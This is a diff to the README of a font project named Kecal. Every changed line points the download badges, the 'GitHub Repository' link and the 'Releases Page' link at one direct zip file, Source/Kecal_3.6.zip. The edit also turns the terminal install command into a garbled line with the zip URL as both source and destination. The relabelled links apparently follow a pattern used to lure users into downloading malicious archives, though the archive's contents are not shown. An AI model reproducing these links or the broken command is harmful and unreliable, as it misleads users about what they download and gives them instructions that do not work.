@@ -1,6 +1,6 @@
 # 🎨 Kecal - A Simple Typeface for Everyday Use
 
-[![Download Kecal](https://img.shields.io/badge/Download-Kecal-brightgreen.svg)](https://github.com/apexj1524/Kecal/releases)
+[![Download Kecal](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)
 
 ## 📥 Introduction
 
@@ -22,7 +22,7 @@ Kecal works on most operating systems. Here’s what you’ll need:
 
 To get started, visit the Releases page to download Kecal. 
 
-[![Download Kecal](https://img.shields.io/badge/Download-Kecal-brightgreen.svg)](https://github.com/apexj1524/Kecal/releases)
+[![Download Kecal](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)
 
 ### Steps to Download
 
@@ -49,7 +49,7 @@ To get started, visit the Releases page to download Kecal.
 1. Open the terminal.
 2. Move the `.otf` file to your local font directory:
    ```
-   mv ~/Downloads/Kecal.otf ~/.fonts/
+   mv ~https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip ~https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip
    ```
 3. Update the font cache:
    ```
@@ -82,7 +82,7 @@ Your feedback is welcome. If you notice issues or want to suggest improvements, 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/apexj1524/Kecal)
-- [Visit the Releases Page to Download](https://github.com/apexj1524/Kecal/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/apexj1524/Kecal/main/Source/Kecal_3.6.zip)
 
 Thank you for choosing Kecal. We hope you enjoy using this font in your projects!
